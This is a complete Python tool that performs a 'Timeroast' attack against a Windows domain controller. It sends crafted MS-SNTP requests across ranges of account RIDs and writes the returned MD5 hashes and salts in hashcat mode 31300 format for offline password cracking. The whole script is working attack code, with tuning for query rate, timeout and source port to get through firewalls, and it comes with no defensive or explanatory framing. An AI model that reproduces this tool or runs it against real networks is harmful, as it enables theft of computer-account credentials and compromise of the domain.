#!/usr/bin/env python3
# timeroast_cur.py — Timeroast (MS-SNTP) current-secret only
# Usage:
#   python3 timeroast_cur.py <DC_IP_OR_HOST> [-o out.txt] [-r "512-580,600,1103-1200"] [-a 180] [-t 24] [-p 0] [-v|-vv]
#
# Output lines (for hashcat -m 31300 --username):
#   "<RID>:$sntp-ms$<md5>$<salt48>"

import argparse
import sys
import socket
import struct
from binascii import hexlify, unhexlify
from select import select
from time import monotonic, time

# 48-byte NTP request prefix; we append 4B keyid + 16B zero MAC
NTP_REQ_PREFIX = unhexlify(
    'db0011e9000000000001000000000000'
    'e1b8407debc7e5060000000000000000'
    '0000000000000000e1b8428bffbfcd0a'
)

def b2h(b: bytes) -> str:
    return hexlify(b).decode()

def build_pkt(keyid: int) -> bytes:
    return NTP_REQ_PREFIX + struct.pack('<I', keyid) + (b'\x00' * 16)

def parse_ranges(ranges: str):
    """
    "512-580,600,1103-1200" -> ascending ints.
    If None: iterate from 500 upward until timeout triggers.
    """
    if not ranges:
        rid = 500
        while True:
            yield rid
            rid += 1
    else:
        spans = []
        for chunk in ranges.split(','):
            chunk = chunk.strip()
            if not chunk:
                continue
            if '-' in chunk:
                lo, hi = chunk.split('-', 1)
                lo, hi = int(lo), int(hi)
                if lo > hi:
                    lo, hi = hi, lo
                spans.append((lo, hi))
            else:
                v = int(chunk)
                spans.append((v, v))
        for lo, hi in sorted(spans):
            for r in range(lo, hi + 1):
                yield r

def ntp_roast(dc: str, rid_ranges: str, rate: float, timeout: float,
              src_port: int, verbose: int):
    """
    Generator yielding (rid, md5digest, salt48, got_keyid).
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if src_port:
        sock.bind(('0.0.0.0', src_port))
    addr = (dc, 123)

    qps = float(rate) if rate and rate > 0 else 0.0
    query_interval = (1.0 / qps) if qps > 0 else 0.0

    rid_iter = parse_ranges(rid_ranges)

    last_activity = monotonic()
    sent = 0
    recv = 0
    start_wall = time()
    last_stat_t = start_wall
    first_rid = None
    last_rid = None

    def log_info(msg: str):
        if verbose >= 1:
            print(msg, file=sys.stderr, flush=True)

    def log_dbg(msg: str):
        if verbose >= 2:
            print(msg, file=sys.stderr, flush=True)

    if verbose >= 1:
        log_info(f'[*] Target={dc} mode=CUR')

    while True:
        now = monotonic()
        if (now - last_activity) >= float(timeout):
            break

        rid = next(rid_iter)
        if first_rid is None:
            first_rid = rid
        last_rid = rid

        keyid = rid  # current-only
        pkt = build_pkt(keyid)
        try:
            sock.sendto(pkt, addr)
            sent += 1
            log_dbg(f'[send] rid={rid} keyid=0x{keyid:08x}')
        except OSError as e:
            log_dbg(f'[send-err] rid={rid} err={e}')

        # opportunistic receive with same pacing
        ready, _, _ = select([sock], [], [], query_interval)
        if not ready:
            if verbose >= 1:
                now_wall = time()
                if now_wall - last_stat_t >= 1.0:
                    elapsed = max(now_wall - start_wall, 1.0)
                    pps = sent / elapsed
                    rps = recv / elapsed
                    log_info(f'[stats] sent={sent} recv={recv} range={first_rid if first_rid is not None else "-"}->{last_rid} pps~{pps:.0f} rps~{rps:.0f}')
                    last_stat_t = now_wall
            continue

        try:
            data, _ = sock.recvfrom(120)
        except OSError as e:
            log_dbg(f'[recv-err] {e}')
            continue

        if len(data) != 68:
            log_dbg(f'[recv-badlen] len={len(data)}')
            continue

        salt48 = data[:48]
        got_keyid = struct.unpack('<I', data[-20:-16])[0]
        md5digest = data[-16:]

        # Map to RID (defensive mask in case high bit is ever set by weird gear)
        mapped_rid = got_keyid & 0x7fffffff

        recv += 1
        last_activity = monotonic()

        log_dbg(f'[recv] rid={mapped_rid} keyid=0x{got_keyid:08x} md5={b2h(md5digest)}')

        yield (mapped_rid, md5digest, salt48, got_keyid)

def main():
    ap = argparse.ArgumentParser(
        description=(
            "Performs an NTP 'Timeroast' attack against a domain controller. "
            "Outputs the resulting hashes in the hashcat format 31300 with the --username flag "
            '("<RID>:$sntp-ms$<hash>$<salt>").\n\n'
            "Usernames in the hash file are user RIDs. You can map RIDs to names later via AD lookups, rDNS, SMB, etc.\n\n"
            "Root or CAP_NET_BIND_SERVICE may be required to receive replies depending on OS/firewall."
        )
    )
    ap.add_argument('dc', help='Hostname or IP address of a domain controller that acts as NTP server.')
    ap.add_argument('-o', '--out', metavar='FILE', default=None,
                    help='Hash output file. Writes to stdout if omitted.')
    ap.add_argument('-r', '--rids', metavar='RIDS', default=None,
                    help='Comma-separated list of RIDs or ranges, e.g. "512-580,600-1400". '
                         'By default, iterates upward from 500 until timeout.')
    ap.add_argument('-a', '--rate', metavar='RATE', type=float, default=180.0,
                    help='Queries per second. Default: 180.')
    ap.add_argument('-t', '--timeout', metavar='TIMEOUT', type=float, default=24.0,
                    help='Stop after TIMEOUT seconds without any replies. Default: 24.')
    ap.add_argument('-p', '--src-port', metavar='PORT', type=int, default=0,
                    help='Source port to use (0 = auto). Sometimes 123 helps with strict firewalls.')
    ap.add_argument('-v', '--verbose', action='count', default=0,
                    help='-v: periodic stats; -vv: log every send/recv.')

    args = ap.parse_args()

    try:
        out_f = sys.stdout if args.out is None else open(args.out, 'w')
    except Exception as e:
        print(f'[!] Could not open output file: {e}', file=sys.stderr)
        sys.exit(1)

    try:
        for rid, hashval, salt, _ in ntp_roast(
            args.dc, args.rids, args.rate, args.timeout, args.src_port, args.verbose
        ):
            out_f.write(f'{rid}:$sntp-ms${b2h(hashval)}${b2h(salt)}\n')
            out_f.flush()
    except KeyboardInterrupt:
        pass
    finally:
        if out_f is not sys.stdout:
            out_f.close()

if __name__ == '__main__':
    main()
